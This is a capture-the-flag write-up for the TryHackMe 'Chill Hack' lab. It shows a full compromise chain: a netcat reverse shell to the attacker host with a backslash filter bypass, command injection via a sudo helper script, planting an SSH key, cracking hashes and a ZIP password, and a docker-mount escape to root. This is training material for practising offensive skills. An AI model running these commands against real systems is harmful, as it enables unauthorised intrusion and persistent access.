<p align="center">
  THM : Chill Hack<br>
  Difficulty : Easy<br>
  Room link : https://tryhackme.com/room/chillhack<br>
  <img src="https://i.imgur.com/1VYKyHc.jpg">
</p>

## Summary

- [Nmap scan](#nmap-scan)
- [FTP enumeration](#ftp-enumeration)
- [Website enumeration](#website-enumeration)
- [Get a shell](#get-a-shell)
- [Privilege escalation](#privilege-escalation)
- [Conclusion](#conclusion)

## Nmap scan

Like always, let's start by an agressive [nmap](https://nmap.org/) scan against the target :  
```
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-25 08:46 CEST
Nmap scan report for 10.10.51.108
Host is up (0.079s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.14.32.60
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Game Info
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.66 seconds
```

There is three open ports : 
- port 21 (FTP), we can log in to the FTP service as as `anonymous` without password
- port 22 (SSH), the SSH service is outdated.
- port 80 (HTTP), there is a website on the target

## FTP enumeration

Let's take a look at the FTP service :  
```
attacker@AttackBox:~/Documents/THM/CTF/Chill_Hack$ ftp 10.10.51.108
Connected to 10.10.51.108.
220 (vsFTPd 3.0.3)
Name (10.10.51.108:attacker): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 03  2020 .
drwxr-xr-x    2 0        115          4096 Oct 03  2020 ..
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
```

There is a file named `note.txt`. Let's download this file and take a look at it :  
```
ftp> get note.txt
local: note.txt remote: note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (90 bytes).
226 Transfer complete.
90 bytes received in 0.00 secs (39.3423 kB/s)
ftp> exit
221 Goodbye.
attacker@AttackBox:~/Documents/THM/CTF/Chill_Hack$ cat note.txt 
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

There is a message talking about some string filering in commands... Maybe there is a page somewhere on the website where we can enter commands. If this is the case, 
we may be able to bypass the filters to get a reverse shell.

## Website enumeration

### Summary

- [Gobuster enumeration](#gobuster-enumeration)
- [Manual enumeration](#manual-enumeration)

### Gobuster enumeration

```
===============================================================
Gobuster v3.2.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.51.108/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.1
[+] Timeout:                 10s
===============================================================
2022/10/25 08:59:39 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 313] [--> http://10.10.51.108/images/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.51.108/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.51.108/js/]
/fonts                (Status: 301) [Size: 312] [--> http://10.10.51.108/fonts/]
/secret               (Status: 301) [Size: 313] [--> http://10.10.51.108/secret/]
/server-status        (Status: 403) [Size: 277]
Progress: 220484 / 220561 (99.97%)
===============================================================
2022/10/25 09:12:32 Finished
===============================================================
```

### Manual enumeration

The only useful page I found is `/secret/`. The other pages are not useful for us. Let's take a look at it :  
![](https://i.imgur.com/Ph7AHsQ.jpg)  

There it is ! It's the page that was mentionned in the `note.txt` file we found earlier. There must be a way to bypass filters. Let's try to execute `ls` :  
![](https://i.imgur.com/UdciKrL.jpg)  

We cannot even execute `ls`... Let's try to use simple bypass methods. We can try to add `\` in the middle of the commamd like so `l\s`, it can't bypass basic filters 
and the server will still interpret the command as `ls` :  
![](https://i.imgur.com/MOm4IYS.jpg)  

It works ! We successfully executed the `ls` command on the target ! Now that we know how to bypass the filter, we can try to get a reverse shell.

## Get a shell 

I used [revshells.com](https://www.revshells.com/) to generate a netcat reverse shell : 
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.14.32.60 4444 >/tmp/f
```

Then I started a netcat listener on my machine :  
```
attacker@AttackBox:~/Documents/THM/CTF/Chill_Hack$ nc -lnvp 4444
listening on [any] 4444 ...
```

And then, I just added a `\` in the `rm` command to bypass the filters. Here is the edited reverse shell :  
```
r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.14.32.60 4444 >/tmp/f
```

I clicked `Execute` on the website, now let's take a look at the netcat listener and see if we have a connection :  
```
attacker@AttackBox:~/Documents/THM/CTF/Chill_Hack$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.14.32.60] from (UNKNOWN) [10.10.51.108] 35656
sh: 0: can't access tty; job control turned off
$
```

We have a connection ! Now that we have a reverse shell, we can stabilize it by using `python3 -c 'import pty; pty.spawn("/bin/bash")'`. Next, we can 
use `export TERM=xterm` to have a more stable shell. To fully stabilize it, we can press CTRL+Z, and then use `stty -echo raw;fg`, and we have a fully stabilized 
reverse shell :  
```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html/secret$ export TERM=xterm
export TERM=xterm
www-data@ubuntu:/var/www/html/secret$ ^Z
[1]+  Stoppé                 nc -lnvp 4444
attacker@AttackBox:~/Documents/THM/CTF/Chill_Hack$ stty -echo raw;fg
nc -lnvp 4444

www-data@ubuntu:/var/www/html/secret$ whoami
www-data
www-data@ubuntu:/var/www/html/secret$ ^C
www-data@ubuntu:/var/www/html/secret$
```

## Privilege escalation

Now, it's time to escalate our privileges. If we use `sudo -l` to list our sudo rights, we notice we can execute a shell script as user `apaar` :  
```
www-data@ubuntu:/home/apaar$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
www-data@ubuntu:/home/apaar$
```

Let's take a look at the file `/home/apaar/.helpline.sh` :  
```
www-data@ubuntu:/home/apaar$ cat .helpline.sh 
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

This script asks for user input but there is no sanitization of it. We may be able to spawn a shell :  
```
www-data@ubuntu:/home/apaar$ sudo -u apaar ./.helpline.sh 

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: test
Hello user! I am test,  Please enter your message: /bin/bash
whoami
apaar
```

We have a shell as user `apaar`. I tried to stabilize it but it didn't work. We can simply generate SSH keypair on our local machine and put our SSH public key in 
`/home/apaar/.ssh/authorized_keys` :  
```
cd .ssh
ls
authorized_keys
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBa3x1jcHAAcbXsGN1N8BTveglLeOosQ3rIAiwVDV6my6bqb1jC5Kc126jgx/+IkqaLUWfykH5dskqvNabssoQI+Bh+gmr6bjdByQWkGOf+gKDhdM+KE0Ui6Jr85SW5Wi2aGB623dL6hf1tYlDXakgDhrMt8tPBxZG2polslyjkXljnpLmILPs+wOm7m89h0z2MuWDHGyt+fDXCnIf/LgUare0tp0QT2scd4JR45rGH6IGJs+iqHV+DPcw8pYW+4zUTbj2sbQxDEgWHESm6z/Beuf9NLwAImHG0YWMKvlVOwBpziy+bMH5/JVdfwkWWy7o0kOFlx6wMA+onx/4leP3smtrT+KJ4qgVzRT8YOu/u3LefwNtXsQ5tjjpkcPoY2289TFrV2VtrKysdPbnVLS5hkx2yh7V3gYMnzhXTKORWn5q2sjm3kVdkyYjXl+Ng7mjyLncDNgFczUrhbH/e8XXdtD5MPEVPlfwMY+o/JDuxp29V+1Ba3TDE3pXVeghQrM= attacker@AttackBox' > authorized_keys
cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBa3x1jcHAAcbXsGN1N8BTveglLeOosQ3rIAiwVDV6my6bqb1jC5Kc126jgx/+IkqaLUWfykH5dskqvNabssoQI+Bh+gmr6bjdByQWkGOf+gKDhdM+KE0Ui6Jr85SW5Wi2aGB623dL6hf1tYlDXakgDhrMt8tPBxZG2polslyjkXljnpLmILPs+wOm7m89h0z2MuWDHGyt+fDXCnIf/LgUare0tp0QT2scd4JR45rGH6IGJs+iqHV+DPcw8pYW+4zUTbj2sbQxDEgWHESm6z/Beuf9NLwAImHG0YWMKvlVOwBpziy+bMH5/JVdfwkWWy7o0kOFlx6wMA+onx/4leP3smtrT+KJ4qgVzRT8YOu/u3LefwNtXsQ5tjjpkcPoY2289TFrV2VtrKysdPbnVLS5hkx2yh7V3gYMnzhXTKORWn5q2sjm3kVdkyYjXl+Ng7mjyLncDNgFczUrhbH/e8XXdtD5MPEVPlfwMY+o/JDuxp29V+1Ba3TDE3pXVeghQrM= attacker@AttackBox
```

Now let's try to connect to SSH as user `apaar` with the private key we generated :  
```
attacker@AttackBox:~/Documents/THM/CTF/Chill_Hack$ ssh apaar@10.10.51.108 -i apaar_rsa 
The authenticity of host '10.10.51.108 (10.10.51.108)' can't be established.
ECDSA key fingerprint is SHA256:ybdflPQMn6OfMBIxgwN4h00kin8TEPN7r8NYtmsx3c8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.51.108' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Oct 25 07:29:55 UTC 2022

  System load:  0.0                Processes:              113
  Usage of /:   24.9% of 18.57GB   Users logged in:        0
  Memory usage: 22%                IP address for eth0:    10.10.51.108
  Swap usage:   0%                 IP address for docker0: 172.17.0.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

19 packages can be updated.
0 updates are security updates.


Last login: Sun Oct  4 14:05:57 2020 from 192.168.184.129
apaar@ubuntu:~$
```

We have now a beautiful and stable shell as user `apaar` ! Let's get the user flag located in `/home/apaar/local.txt` :  
```
apaar@ubuntu:~$ ls -la
total 44
drwxr-xr-x 5 apaar apaar 4096 Oct  4  2020 .
drwxr-xr-x 5 root  root  4096 Oct  3  2020 ..
-rw------- 1 apaar apaar    0 Oct  4  2020 .bash_history
-rw-r--r-- 1 apaar apaar  220 Oct  3  2020 .bash_logout
-rw-r--r-- 1 apaar apaar 3771 Oct  3  2020 .bashrc
drwx------ 2 apaar apaar 4096 Oct  3  2020 .cache
drwx------ 3 apaar apaar 4096 Oct  3  2020 .gnupg
-rwxrwxr-x 1 apaar apaar  286 Oct  4  2020 .helpline.sh
-rw-rw---- 1 apaar apaar   46 Oct  4  2020 local.txt
-rw-r--r-- 1 apaar apaar  807 Oct  3  2020 .profile
drwxr-xr-x 2 apaar apaar 4096 Oct  3  2020 .ssh
-rw------- 1 apaar apaar  817 Oct  3  2020 .viminfo
apaar@ubuntu:~$ cat local.txt 
{USER-FLAG: ****************************}
apaar@ubuntu:~$
```

Now, it's time to get root. I tried to do manual enumeration but I didn't find anything useful. So I used [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) 
and found and interesting listening port (port 9001) :  
![](https://i.imgur.com/UIUslXP.jpg)  

We can use SSH to create a local port forward to acces the port 9001 of the target from our machine :  
```
attacker@AttackBox:~/Documents/THM/CTF/Chill_Hack$ ssh -L 9001:127.0.0.1:9001 apaar@10.10.51.108 -i apaar_rsa
...
...
```

Now, let's try to access port 9001 using a web browser :  
![](https://i.imgur.com/0M8FALV.jpg)  

There is a login page. I tried to use default credentials like admin or root as password and username but it didn't work... After some research, I noticed that this
website is stored in `/var/www/` on the target machine. By looking in `/var/www/files/index.php`, I found the mysql credentials :  
```
apaar@ubuntu:/var/www/files$ ls
account.php  hacker.php  images  index.php  style.css
apaar@ubuntu:/var/www/files$ cat index.php 
<html>
<body>
<?php
	if(isset($_POST['submit']))
	{
		$username = $_POST['username'];
		$password = $_POST['password'];
		ob_start();
		session_start();
		try
		{
			$con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
			$con->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING);
		}
		catch(PDOException $e)
		{
			exit("Connection failed ". $e->getMessage());
		}
		require_once("account.php");
		$account = new Account($con);
		$success = $account->login($username,$password);
		if($success)
		{
			header("Location: hacker.php");
		}
	}
?>
<link rel="stylesheet" type="text/css" href="style.css">
	<div class="signInContainer">
		<div class="column">
			<div class="header">
				<h2 style="color:blue;">Customer Portal</h2>
				<h3 style="color:green;">Log In<h3>
			</div>
			<form method="POST">
				<?php echo $success?>
                		<input type="text" name="username" id="username" placeholder="Username" required>
				<input type="password" name="password" id="password" placeholder="Password" required>
				<input type="submit" name="submit" value="Submit">
        		</form>
		</div>
	</div>
</body>
</html>
```

Let's connect to mysql using the credentials we just found and see what we can find :  
```
apaar@ubuntu:/var/www/files$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 29
Server version: 5.7.31-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| webportal          |
+--------------------+
5 rows in set (0.00 sec)

mysql> use webportal
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------+
| Tables_in_webportal |
+---------------------+
| users               |
+---------------------+
1 row in set (0.01 sec)

mysql> select * from users;
+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
+----+-----------+----------+-----------+----------------------------------+
2 rows in set (0.00 sec)

mysql>
```

We have found the usernames and password hashed for the login page ! Let's try to crack the first hash (I used [this online tool](https://hashes.com/en/tools/hash_identifier)):  
![](https://i.imgur.com/JLiBBjE.jpg)  

Now that we have the password for user Aurick, let's use those credentials on the login page :  
![](https://i.imgur.com/BtAirTo.jpg)  

We are redirected to `hacker.php`. There is a message telling us to find the answer in the dark. I downloaded the two image files present on this page. Since the file 
`hacker-with-laptop_23-2147985341.jpg` is a JPG file, I tried to use steghide to extract hidden data from it :  
```
attacker@AttackBox:~/Documents/THM/CTF/Chill_Hack$ steghide --extract -sf hacker-with-laptop_23-2147985341.jpg 
Entrez la passphrase: 
�criture des donn�es extraites dans "backup.zip".
attacker@AttackBox:~/Documents/THM/CTF/Chill_Hack$
```

We successfully extracted hidden data from the image ! We have now a ZIP file named `backup.zip`. Let's extract it :  
```
attacker@AttackBox:~/Documents/THM/CTF/Chill_Hack$ 7z e backup.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=fr_FR.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD Ryzen 3 3100 4-Core Processor               (870F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 750 bytes (1 KiB)

Extracting archive: backup.zip
--
Path = backup.zip
Type = zip
Physical Size = 750

    
Enter password (will not be echoed):
ERROR: Wrong password : source_code.php
                      
Sub items Errors: 1

Archives with Errors: 1

Sub items Errors: 1
```

The ZIP file is protected by a password. We can use john to try to crack it :  
```
attacker@AttackBox:~/Documents/THM/CTF/Chill_Hack$ zip2john backup.zip > hash.txt 
ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3 ts=2297 cs=2297 type=8
attacker@AttackBox:~/Documents/THM/CTF/Chill_Hack$ john hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
0g 0:00:00:00 DONE 1/3 (2022-10-25 11:35) 0g/s 446866p/s 446866c/s 446866C/s Phpsource1900..Pcode1900
Proceeding with wordlist:/opt/john/run/password.lst
Enabling duplicate candidate password suppressor
pass1word        (backup.zip/source_code.php)     
1g 0:00:00:00 DONE 2/3 (2022-10-25 11:35) 2.702g/s 203302p/s 203302c/s 203302C/s hjvfirf..nelly1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We have successfully cracked the ZIP file password ! Let's unzip it now :  
```
attacker@AttackBox:~/Documents/THM/CTF/Chill_Hack$ unzip backup.zip 
Archive:  backup.zip
[backup.zip] source_code.php password: 
  inflating: source_code.php         
attacker@AttackBox:~/Documents/THM/CTF/Chill_Hack$ cat source_code.php 
<html>
<head>
	Admin Portal
</head>
        <title> Site Under Development ... </title>
        <body>
                <form method="POST">
                        Username: <input type="text" name="name" placeholder="username"><br><br>
			Email: <input type="email" name="email" placeholder="email"><br><br>
			Password: <input type="password" name="password" placeholder="password">
                        <input type="submit" name="submit" value="Submit"> 
		</form>
<?php
        if(isset($_POST['submit']))
	{
		$email = $_POST["email"];
		$password = $_POST["password"];
		if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
		{ 
			$random = rand(1000,9999);?><br><br><br
			<form method="POST">
				Enter the OTP: <input type="number" name="otp">
				<input type="submit" name="submitOtp" value="Submit">
			</form>
		<?php	mail($email,"OTP for authentication",$random);
			if(isset($_POST["submitOtp"]))
				{
					$otp = $_POST["otp"];
					if($otp == $random)
					{
						echo "Welcome Anurodh!";
						header("Location: authenticated.php");
					}
					else
					{
						echo "Invalid OTP";
					}
				}
 		}
		else
		{
			echo "Invalid Username or Password";
		}
        }
?>
</html>
attacker@AttackBox:~/Documents/THM/CTF/Chill_Hack$
```

There is a base64 encoded password in this file. Let's decode it :  
```
attacker@AttackBox:~/Documents/THM/CTF/Chill_Hack$ echo 'IWQwbnRLbjB3bVlwQHNzdzByZA==' | base64 -d
!d0ntKn0wmYp@ssw0rd
```

We can notice "Welcome Anurodh" in the php source code. The password must be Anurodh password. Let's try to use it on the target machine :  
```
paar@ubuntu:/var/www/files$ su anurodh
Password: 
anurodh@ubuntu:/var/www/files$
```

We have a shell as Anurodh ! If we use `id`, we can notice we are member of group docker so we can use docker. Let's search for docker on [GTFOBins](https://gtfobins.github.io/) :  
![](https://i.imgur.com/j5YGK2v.jpg)  

Let's try to spawn a shell with this method :  
```
anurodh@ubuntu:/tmp$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# # whoami
root
```

We are root ! Let's get the root flag :  
```
# cd /root
# ls
proof.txt
# cat proof.txt


					{ROOT-FLAG: ******************************}


Congratulations! You have successfully completed the challenge.


         ,-.-.     ,----.                                             _,.---._    .-._           ,----.  
,-..-.-./  \==\ ,-.--` , \   _.-.      _.-.             _,..---._   ,-.' , -  `. /==/ \  .-._ ,-.--` , \ 
|, \=/\=|- |==||==|-  _.-` .-,.'|    .-,.'|           /==/,   -  \ /==/_,  ,  - \|==|, \/ /, /==|-  _.-` 
|- |/ |/ , /==/|==|   `.-.|==|, |   |==|, |           |==|   _   _\==|   .=.     |==|-  \|  ||==|   `.-. 
 \, ,     _|==/==/_ ,    /|==|- |   |==|- |           |==|  .=.   |==|_ : ;=:  - |==| ,  | -/==/_ ,    / 
 | -  -  , |==|==|    .-' |==|, |   |==|, |           |==|,|   | -|==| , '='     |==| -   _ |==|    .-'  
  \  ,  - /==/|==|_  ,`-._|==|- `-._|==|- `-._        |==|  '='   /\==\ -    ,_ /|==|  /\ , |==|_  ,`-._ 
  |-  /\ /==/ /==/ ,     //==/ - , ,/==/ - , ,/       |==|-,   _`/  '.='. -   .' /==/, | |- /==/ ,     / 
  `--`  `--`  `--`-----`` `--`-----'`--`-----'        `-.`.____.'     `--`--''   `--`./  `--`--`-----``  


--------------------------------------------Designed By -------------------------------------------------------
					|  Anurodh Acharya |
					---------------------

	               		     Let me know if you liked it.

Twitter
	- @acharya_anurodh
Linkedin
	- www.linkedin.com/in/anurodh-acharya-b1937116a
```

## Conclusion

This room was very complete and it made me train on linux enumeration. Thanks for this room and thanks for reading my write ups !
